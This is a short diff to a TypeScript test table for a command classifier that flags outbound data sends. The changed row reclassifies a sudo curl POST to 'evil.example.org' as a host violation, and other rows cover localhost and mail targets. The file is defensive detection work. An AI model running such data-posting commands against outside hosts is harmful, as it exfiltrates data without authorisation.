@@ -59,7 +59,7 @@ const TABLE: Array<[string, string[]]> = [
   ['curl -d x localhost:8080/hook', ['http-send violation host:localhost']],
   ['curl -d x smtp://mail.example.internal', ['mail-send violation mail']],
   ['curl -G -d x https://host.example.org/hook', []],
-  ['FOO=1 sudo curl -d x https://evil.example.org', ['http-send unknown-destination unresolved:environment-pin']],
+  ['FOO=1 sudo curl -d x https://evil.example.org', ['http-send violation host:evil.example.org']],
   ['env -C ~ gh pr create --title x', ['gh-write unknown-destination unresolved:no-repository']],
   // option failures
   ['sudo -Z "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
